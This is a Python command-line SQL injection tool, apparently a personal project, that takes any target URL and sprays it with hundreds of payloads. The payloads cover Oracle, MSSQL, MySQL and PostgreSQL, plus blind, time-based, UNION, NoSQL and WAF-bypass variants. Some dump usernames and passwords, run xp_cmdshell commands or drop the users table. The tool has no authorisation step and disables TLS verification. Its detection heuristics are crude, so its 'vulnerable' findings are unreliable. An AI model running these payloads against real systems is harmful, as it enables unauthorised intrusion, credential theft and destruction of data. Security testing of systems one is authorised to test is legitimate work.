#!/usr/bin/env python3
"""
AutoSQLi Tool By Vishal Tiwari
"""

import requests
import time
import sys
import re
import json
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
from collections import OrderedDict
from datetime import datetime
from typing import Dict, List, Optional
import urllib3
from colorama import init, Fore, Style, Back

# Initialize colorama
init(autoreset=True)

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    RED = Fore.RED
    GREEN = Fore.GREEN
    YELLOW = Fore.YELLOW
    CYAN = Fore.CYAN
    MAGENTA = Fore.MAGENTA
    WHITE = Fore.WHITE
    BRIGHT = Style.BRIGHT
    DIM = Style.DIM
    RESET = Style.RESET_ALL

class AutoSQLiUltimate:
    def __init__(self):
        self.session = requests.Session()
        self.results = {
            "vulnerable": False,
            "scan_start": None,
            "scan_end": None,
            "total_payloads_tested": 0,
            "injection_points": [],
            "database_info": {
                "type": None,
                "version": None,
                "user": None,
                "current_database": None,
                "hostname": None
            },
            "techniques_found": []
        }
        
        self.lock = threading.Lock()
        self.baseline_response = None
        self.progress_count = 0
        
        # ==================== COMPLETE PAYLOADS ====================
        
        # Oracle payloads
        self.oracle_payloads = [
            "'+UNION+SELECT+BANNER,+NULL+FROM+v$version--",
            "'+UNION+SELECT+NULL,+table_name+FROM+all_tables--",
            "'+UNION+SELECT+column_name,+NULL+FROM+all_tab_columns+WHERE+table_name='USERS'--",
            "'+UNION+SELECT+username,+password+FROM+all_users--",
            "'+AND+1=CTXSYS.DRITHSX.SN(1,(SELECT+BANNER+FROM+v$version+WHERE+ROWNUM=1))--",
            "'+AND+DBMS_LOCK.SLEEP(5)--",
            "'+AND+SYS.DBMS_LOCK.SLEEP(5)--"
        ]
        
        # MSSQL payloads
        self.mssql_payloads = [
            "'+UNION+SELECT+@@version,+NULL--",
            "'+UNION+SELECT+@@servername,+@@version--",
            "'+UNION+SELECT+name,+NULL+FROM+sys.databases--",
            "'+AND+1=CONVERT(INT,@@version)--",
            "';+WAITFOR+DELAY+'0:0:5'--",
            "';+EXEC+xp_cmdshell('whoami')--",
            "'+AND+1=CAST((SELECT+@@version)+AS+INT)--"
        ]
        
        # MySQL payloads
        self.mysql_payloads = [
            "'+UNION+SELECT+@@version,+NULL#",
            "'+UNION+SELECT+database(),+user()#",
            "'+UNION+SELECT+GROUP_CONCAT(schema_name)+FROM+information_schema.schemata--",
            "'+AND+extractvalue(1,concat(0x7e,database()))--",
            "'+AND+updatexml(1,concat(0x7e,database()),1)--",
            "'+AND+SLEEP(5)--",
            "'+AND+BENCHMARK(10000000,MD5('a'))--",
            "'+AND+IF(1=1,SLEEP(5),0)--",
            "';+DROP+TABLE+users--"
        ]
        
        # PostgreSQL payloads
        self.postgresql_payloads = [
            "'+UNION+SELECT+version(),+NULL--",
            "'+UNION+SELECT+current_database(),+current_user--",
            "'+AND+1=CAST((SELECT+version())+AS+INT)--",
            "'+AND+pg_sleep(5)--",
            "'+AND+(SELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END)--"
        ]
        
        # Blind SQL injection payloads (YOUR specific ones)
        self.blind_payloads = [
            "1'+AND+'1'='1",
            "1'+AND+'1'='2",
            "1'+AND+1=1--",
            "1'+AND+1=2--",
            "TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--",
            "' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a'--",
            "' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users LIMIT 1)=97--",
            "' AND (SELECT COUNT(*) FROM users)>0--"
        ]
        
        # Time-based payloads
        self.time_payloads = [
            "'+AND+SLEEP(5)--",
            "'+AND+pg_sleep(5)--",
            "'+WAITFOR+DELAY+'0:0:5'--",
            "'+AND+DBMS_LOCK.SLEEP(5)--",
            "'+AND+IF(1=1,SLEEP(5),0)--"
        ]
        
        # UNION payloads (up to 20 columns)
        self.union_payloads = []
        for i in range(1, 21):
            nulls = ','.join(['NULL'] * i)
            self.union_payloads.append(f"' UNION SELECT {nulls}--")
            self.union_payloads.append(f"' UNION SELECT {nulls}#")
            self.union_payloads.append(f"1' UNION SELECT {nulls}--")
        
        # JSON payloads
        self.json_payloads = [
            '{"username": "' + "' OR '1'='1" + '"}',
            '{"username": "' + "' UNION SELECT NULL--" + '"}',
            '{"id": "1\' AND 1=1--"}',
            '{"username": {"$ne": null}}',
            '{"$where": "this.password.length > 0"}',
            '{"$or": [{"username": "admin"}, {"password": {"$ne": ""}}]}'
        ]
        
        # WAF bypass payloads
        self.waf_bypass_payloads = [
            "' UnIoN SeLeCt NULL--",
            "' aNd 1=1--",
            "'%20UNION%20SELECT%20NULL--",
            "'/**/UNION/**/SELECT/**/NULL--",
            "'/*!50000UNION*/ /*!50000SELECT*/ NULL--",
            "'%0aUNION%0aSELECT%0aNULL--"
        ]
        
        # Data extraction payloads
        self.extraction_payloads = [
            "'+UNION+SELECT+@@version,NULL--",
            "'+UNION+SELECT+database(),NULL--",
            "'+UNION+SELECT+user(),NULL--",
            "'+UNION+SELECT+GROUP_CONCAT(table_name)+FROM+information_schema.tables--",
            "'+UNION+SELECT+GROUP_CONCAT(column_name)+FROM+information_schema.columns--",
            "'+UNION+SELECT+username,password+FROM+users--"
        ]
        
        # Combine all payloads
        self.all_payloads = (
            self.oracle_payloads +
            self.mssql_payloads +
            self.mysql_payloads +
            self.postgresql_payloads +
            self.blind_payloads +
            self.time_payloads +
            self.union_payloads +
            self.json_payloads +
            self.waf_bypass_payloads +
            self.extraction_payloads
        )
        
        # Remove duplicates while preserving order
        self.all_payloads = list(OrderedDict.fromkeys(self.all_payloads))
        
        # Database signatures
        self.db_signatures = {
            "oracle": {
                "patterns": [r"ORA-\d{5}", r"Oracle Database", r"v\$version"],
                "version_pattern": r"Oracle\s+(\d{2,3}[a-z]?\w*)"
            },
            "mssql": {
                "patterns": [r"Microsoft SQL Server", r"@@version", r"xp_cmdshell"],
                "version_pattern": r"Microsoft SQL Server\s+(\d{4}|\d+\.\d+)"
            },
            "mysql": {
                "patterns": [r"MySQL", r"MariaDB", r"@@version", r"information_schema"],
                "version_pattern": r"(\d+\.\d+\.\d+(?:-MariaDB)?)"
            },
            "postgresql": {
                "patterns": [r"PostgreSQL", r"pg_sleep", r"current_database"],
                "version_pattern": r"PostgreSQL\s+(\d+\.\d+)"
            }
        }
        
        # Session optimization
        self.session.adapters.DEFAULT_RETRIES = 2
        
    def print_banner(self):
        banner = f"""
{Colors.CYAN}{'='*70}
{Colors.MAGENTA}{Colors.BRIGHT}                 AutoSQLi Tool By Vishal Tiwari
{Colors.CYAN}{'='*70}

        """
        print(banner)
    
    def get_target_config(self):
        """Get target configuration from user"""
        print(f"{Colors.YELLOW}[?] Target Configuration{Colors.RESET}")
        print(f"{Colors.DIM}{'-'*50}{Colors.RESET}")
        
        config = {}
        
        config['url'] = input(f"{Colors.GREEN}[>]{Colors.RESET} Target URL: ").strip()
        config['method'] = input(f"{Colors.GREEN}[>]{Colors.RESET} HTTP Method (GET/POST) [GET]: ").strip().upper() or "GET"
        
        if config['method'] == "GET":
            parsed = urlparse(config['url'])
            params = parse_qs(parsed.query)
            if params:
                print(f"{Colors.CYAN}[!]{Colors.RESET} Detected parameters: {', '.join(params.keys())}")
                if input(f"{Colors.GREEN}[>]{Colors.RESET} Use these? (Y/n): ").lower() != 'n':
                    config['parameters'] = list(params.keys())
                else:
                    config['parameters'] = [p.strip() for p in input(f"{Colors.GREEN}[>]{Colors.RESET} Parameter names (comma-separated): ").split(',')]
            else:
                config['parameters'] = [p.strip() for p in input(f"{Colors.GREEN}[>]{Colors.RESET} Parameter names (comma-separated): ").split(',')]
        else:
            config['parameters'] = [p.strip() for p in input(f"{Colors.GREEN}[>]{Colors.RESET} Parameter names (comma-separated): ").split(',')]
            config['post_data'] = input(f"{Colors.GREEN}[>]{Colors.RESET} POST data template: ")
        
        config['cookie'] = input(f"{Colors.GREEN}[>]{Colors.RESET} Cookie (optional): ").strip() or None
        config['user_agent'] = input(f"{Colors.GREEN}[>]{Colors.RESET} User-Agent [Default]: ").strip()
        if not config['user_agent']:
            config['user_agent'] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        
        config['threads'] = int(input(f"{Colors.GREEN}[>]{Colors.RESET} Threads [10]: ").strip() or 10)
        config['delay'] = float(input(f"{Colors.GREEN}[>]{Colors.RESET} Delay (seconds) [0.2]: ").strip() or 0.2)
        config['timeout'] = int(input(f"{Colors.GREEN}[>]{Colors.RESET} Timeout (seconds) [10]: ").strip() or 10)
        
        print(f"\n{Colors.YELLOW}[?] Test Scope{Colors.RESET}")
        print(f"  {Colors.CYAN}1.{Colors.RESET} Quick (100 payloads)")
        print(f"  {Colors.CYAN}2.{Colors.RESET} Standard (250 payloads)")
        print(f"  {Colors.CYAN}3.{Colors.RESET} Aggressive (All {len(self.all_payloads)} payloads)")
        
        scope_choice = input(f"{Colors.GREEN}[>]{Colors.RESET} Choose (1-3) [3]: ").strip() or "3"
        
        if scope_choice == "1":
            config['payload_limit'] = 100
        elif scope_choice == "2":
            config['payload_limit'] = 250
        else:
            config['payload_limit'] = len(self.all_payloads)
        
        return config
    
    def prepare_request(self, target: Dict, parameter: str, value: str) -> Optional[requests.Response]:
        """Send request with injected payload"""
        try:
            headers = {
                'User-Agent': target['user_agent'],
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'close'
            }
            
            if target['cookie']:
                headers['Cookie'] = target['cookie']
            
            if target['method'] == "GET":
                parsed = urlparse(target['url'])
                params = parse_qs(parsed.query, keep_blank_values=True)
                params[parameter] = [value]
                new_query = urlencode(params, doseq=True)
                new_url = urlunparse(parsed._replace(query=new_query))
                
                response = self.session.get(
                    new_url, headers=headers, timeout=target['timeout'], verify=False
                )
            else:
                post_data = target['post_data']
                pattern = rf'({parameter}=)[^&]*'
                new_post_data = re.sub(pattern, rf'\g<1>{value}', post_data)
                
                response = self.session.post(
                    target['url'], data=new_post_data, headers=headers, 
                    timeout=target['timeout'], verify=False
                )
            
            return response
        except Exception:
            return None
    
    def analyze_response(self, response, original_response, payload, response_time) -> tuple:
        """Analyze response for SQL injection indicators"""
        if not response:
            return False, None, []
        
        vulnerable = False
        db_type = None
        evidence = []
        
        # Check for database errors
        db_checks = {
            "oracle": ["ORA-", "Oracle Database", "v$version"],
            "mssql": ["Microsoft SQL Server", "Unclosed quotation mark", "sql server"],
            "mysql": ["MySQL", "MariaDB", "You have an error in your SQL syntax"],
            "postgresql": ["PostgreSQL", "PG::Error", "psql"]
        }
        
        for db, patterns in db_checks.items():
            for pattern in patterns:
                if pattern.lower() in response.text.lower():
                    db_type = db
                    vulnerable = True
                    evidence.append(f"Found {db} error: {pattern}")
                    break
        
        # Check for data leakage (UNION)
        if len(response.text) > len(original_response.text) * 1.5:
            vulnerable = True
            evidence.append(f"Response size increased: {len(response.text)} bytes")
        
        # Check for time-based injection
        if response_time >= 4.5:
            vulnerable = True
            evidence.append(f"Time delay detected: {response_time:.2f}s")
        
        # Check for version leakage
        version_patterns = [
            r'\d+\.\d+\.\d+',  # MySQL/PostgreSQL version
            r'Microsoft SQL Server \d{4}',  # MSSQL
            r'Oracle Database \d+\w+'  # Oracle
        ]
        
        for pattern in version_patterns:
            matches = re.findall(pattern, response.text, re.IGNORECASE)
            if matches:
                evidence.append(f"Version leaked: {matches[0]}")
        
        # Check for table/data extraction
        if any(x in response.text.lower() for x in ['users', 'passwords', 'admin', 'username']):
            vulnerable = True
            evidence.append("Sensitive data detected in response")
        
        # Check for CAST/CONVERT errors
        if any(x in response.text.lower() for x in ['conversion failed', 'error converting', 'cast failed']):
            vulnerable = True
            evidence.append("CAST/CONVERT error - Data extraction possible")
        
        return vulnerable, db_type, evidence
    
    def test_parameter(self, target: Dict, parameter: str, baseline_response, payloads: List[str]):
        """Test a single parameter with multiple payloads"""
        results = []
        
        for i, payload in enumerate(payloads):
            if i >= target['payload_limit']:
                break
            
            try:
                start_time = time.time()
                response = self.prepare_request(target, parameter, payload)
                response_time = time.time() - start_time
                
                if response:
                    is_vulnerable, db_type, evidence = self.analyze_response(
                        response, baseline_response, payload, response_time
                    )
                    
                    if is_vulnerable:
                        with self.lock:
                            self.results['vulnerable'] = True
                            result = {
                                "parameter": parameter,
                                "payload": payload,
                                "db_type": db_type,
                                "evidence": evidence,
                                "response_time": response_time
                            }
                            results.append(result)
                            
                            print(f"\n{Colors.RED}[!] VULNERABLE FOUND!{Colors.RESET}")
                            print(f"    {Colors.YELLOW}Parameter:{Colors.RESET} {parameter}")
                            print(f"    {Colors.YELLOW}Payload:{Colors.RESET} {payload[:100]}")
                            print(f"    {Colors.YELLOW}Evidence:{Colors.RESET} {', '.join(evidence)}")
                            
                            if db_type:
                                self.results['database_info']['type'] = db_type
                                print(f"    {Colors.YELLOW}Database:{Colors.RESET} {db_type.upper()}")
                            
                            # Extract version if found
                            version_match = re.search(r'\d+\.\d+\.\d+', response.text)
                            if version_match:
                                self.results['database_info']['version'] = version_match.group()
                                print(f"    {Colors.YELLOW}Version:{Colors.RESET} {version_match.group()}")
                
                time.sleep(target['delay'])
                
                # Progress indicator
                with self.lock:
                    self.progress_count += 1
                    if self.progress_count % 50 == 0:
                        print(f"{Colors.DIM}[*] Progress: {self.progress_count}/{len(payloads)}{Colors.RESET}", end='\r')
                        
            except Exception as e:
                continue
        
        return results
    
    def run(self):
        """Main execution"""
        self.print_banner()
        config = self.get_target_config()
        
        print(f"\n{Colors.CYAN}[*] Starting SQL injection test...{Colors.RESET}")
        print(f"    Target: {config['url']}")
        print(f"    Parameters: {', '.join(config['parameters'])}")
        print(f"    Payloads: {config['payload_limit']}")
        print(f"    Threads: {config['threads']}")
        
        # Get baseline response
        print(f"\n{Colors.CYAN}[*] Establishing baseline...{Colors.RESET}")
        baseline_response = None
        for param in config['parameters']:
            baseline_response = self.prepare_request(config, param, "1")
            if baseline_response:
                break
        
        if not baseline_response:
            print(f"{Colors.RED}[-] Cannot connect to target!{Colors.RESET}")
            return
        
        self.baseline_response = baseline_response
        self.results['scan_start'] = datetime.now()
        
        # Limit payloads based on scope
        test_payloads = self.all_payloads[:config['payload_limit']]
        
        # Test parameters concurrently
        print(f"\n{Colors.CYAN}[*] Testing {len(test_payloads)} payloads...{Colors.RESET}\n")
        
        with ThreadPoolExecutor(max_workers=config['threads']) as executor:
            futures = []
            for param in config['parameters']:
                future = executor.submit(
                    self.test_parameter, config, param, baseline_response, test_payloads
                )
                futures.append(future)
            
            for future in as_completed(futures):
                try:
                    results = future.result()
                    with self.lock:
                        self.results['injection_points'].extend(results)
                except Exception as e:
                    print(f"{Colors.RED}Error: {e}{Colors.RESET}")
        
        self.results['scan_end'] = datetime.now()
        
        # Generate report
        self.generate_report()
    
    def generate_report(self):
        """Generate final report"""
        print(f"\n{Colors.CYAN}{'='*70}{Colors.RESET}")
        print(f"{Colors.GREEN}{Colors.BRIGHT}                    SCAN COMPLETE{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*70}{Colors.RESET}")
        
        duration = (self.results['scan_end'] - self.results['scan_start']).total_seconds()
        
        print(f"\n{Colors.WHITE}Duration: {duration:.2f} seconds")
        print(f"Total Payloads Tested: {self.results['total_payloads_tested']}")
        
        if self.results['vulnerable']:
            print(f"\n{Colors.RED}{Colors.BRIGHT}[!] VULNERABLE! SQL injection found!{Colors.RESET}")
            print(f"\n{Colors.YELLOW}Found {len(self.results['injection_points'])} injection point(s):{Colors.RESET}")
            
            for i, point in enumerate(self.results['injection_points'][:5], 1):
                print(f"\n  [{i}] Parameter: {point['parameter']}")
                print(f"      Payload: {point['payload'][:80]}...")
                print(f"      Evidence: {', '.join(point['evidence'][:2])}")
                if point.get('db_type'):
                    print(f"      Database: {point['db_type'].upper()}")
            
            if self.results['database_info']['type']:
                print(f"\n{Colors.GREEN}[+] Detected Database: {self.results['database_info']['type'].upper()}{Colors.RESET}")
            if self.results['database_info']['version']:
                print(f"{Colors.GREEN}[+] Detected Version: {self.results['database_info']['version']}{Colors.RESET}")
        else:
            print(f"\n{Colors.GREEN}[+] No SQL injection vulnerabilities detected{Colors.RESET}")
        
        # Save report
        report_file = f"autosqli_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(report_file, 'w') as f:
            f.write(f"AutoSQLi Report - {datetime.now()}\n")
            f.write(f"{'='*60}\n")
            f.write(f"Target: {self.results.get('target_url', 'N/A')}\n")
            f.write(f"Vulnerable: {self.results['vulnerable']}\n")
            f.write(f"Injection Points: {len(self.results['injection_points'])}\n")
            if self.results['database_info']['type']:
                f.write(f"Database: {self.results['database_info']['type']}\n")
            if self.results['database_info']['version']:
                f.write(f"Version: {self.results['database_info']['version']}\n")
        
        print(f"\n{Colors.CYAN}[*] Report saved to: {report_file}{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*70}{Colors.RESET}\n")

def main():
    try:
        tester = AutoSQLiUltimate()
        tester.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Interrupted by user{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error: {e}{Colors.RESET}")
        sys.exit(1)

if __name__ == "__main__":
    main()
